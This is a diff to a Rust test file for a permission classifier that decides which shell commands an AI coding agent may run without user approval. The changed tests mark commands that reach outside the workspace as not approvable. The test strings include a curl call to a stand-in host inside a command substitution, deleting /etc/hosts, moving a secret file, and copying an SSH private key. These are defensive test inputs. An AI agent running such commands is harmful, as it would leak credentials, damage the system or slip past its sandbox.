@@ -36,16 +36,20 @@ fn accept_edits_approves_file_writes_and_workspace_fs_commands() {
         "shell",
         &json!({"command": "touch $(curl http://x/leak)"})
     ));
-    // An fs command whose path escapes the workspace now DOES pass this
-    // classifier — the OS sandbox denies the out-of-workspace write at
-    // execution, so the classifier no longer duplicates that path parsing.
-    assert!(accept_edits_approvable(
+    // An fs command whose operand leaves the workspace by spelling does NOT
+    // pass: the sandbox bounds the write side of such a path, but `cp <outside> .`
+    // is a read it does not bound, so the allowance refuses the spelling.
+    assert!(!accept_edits_approvable(
         "shell",
         &json!({"command": "rm /etc/hosts"})
     ));
-    assert!(accept_edits_approvable(
+    assert!(!accept_edits_approvable(
         "shell",
         &json!({"command": "mv ../secret ."})
+    ));
+    assert!(!accept_edits_approvable(
+        "shell",
+        &json!({"command": "cp ~/.ssh/id_rsa ./k"})
     ));
     // Network tools never qualify under accept-edits.
     assert!(!accept_edits_approvable(
